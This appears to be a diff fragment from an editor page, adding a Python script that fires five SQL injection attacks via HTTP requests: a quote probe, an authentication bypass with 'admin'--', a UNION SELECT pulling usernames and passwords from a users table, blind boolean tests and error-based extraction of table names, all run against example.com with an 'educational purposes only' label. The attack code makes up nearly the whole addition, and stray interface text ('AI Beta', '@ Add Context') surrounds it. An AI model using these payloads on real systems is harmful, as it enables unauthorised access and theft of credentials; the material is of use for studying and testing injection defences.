@@ -537,3 +537,70 @@ These examples illustrate how attackers can exploit vulnerabilities in web appli
 @ Add Context
 AI Beta
 
+// 
+import requests
+
+# Example of a basic SQL injection attempt
+def basic_sql_injection(url):
+    payload = "'"
+    try:
+        response = requests.get(f"{url}?category=Gifts{payload}")
+        print(f"Response status code: {response.status_code}")
+        print(f"Response content: {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Request failed: {e}")
+
+# Example of bypassing authentication
+def bypass_authentication(url):
+    payload = "admin'--"
+    data = {'username': payload, 'password': ''}
+    try:
+        response = requests.post(f"{url}/login", data=data)
+        print(f"Response status code: {response.status_code}")
+        print(f"Response content: {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Request failed: {e}")
+
+# Example of a union-based SQL injection
+def union_based_sql_injection(url):
+    payload = "' UNION SELECT username, password FROM users--"
+    try:
+        response = requests.get(f"{url}?category=Gifts{payload}")
+        print(f"Response status code: {response.status_code}")
+        print(f"Response content: {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Request failed: {e}")
+
+# Example of a blind SQL injection
+def blind_sql_injection(url):
+    payload_true = "' AND 1=1--"
+    payload_false = "' AND 1=2--"
+    try:
+        response_true = requests.get(f"{url}?category=Gifts{payload_true}")
+        response_false = requests.get(f"{url}?category=Gifts{payload_false}")
+        print(f"Response for true condition: {response_true.status_code}")
+        print(f"Response for false condition: {response_false.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"Request failed: {e}")
+
+# Example of an error-based SQL injection
+def error_based_sql_injection(url):
+    payload = "' OR 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--"
+    try:
+        response = requests.get(f"{url}?category=Gifts{payload}")
+        print(f"Response status code: {response.status_code}")
+        print(f"Response content: {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Request failed: {e}")
+
+# Example URLs (for educational purposes only)
+url = "https://example.com"
+
+basic_sql_injection(url)
+bypass_authentication(url)
+union_based_sql_injection(url)
+blind_sql_injection(url)
+error_based_sql_injection(url)
+@ Add Context
+
+
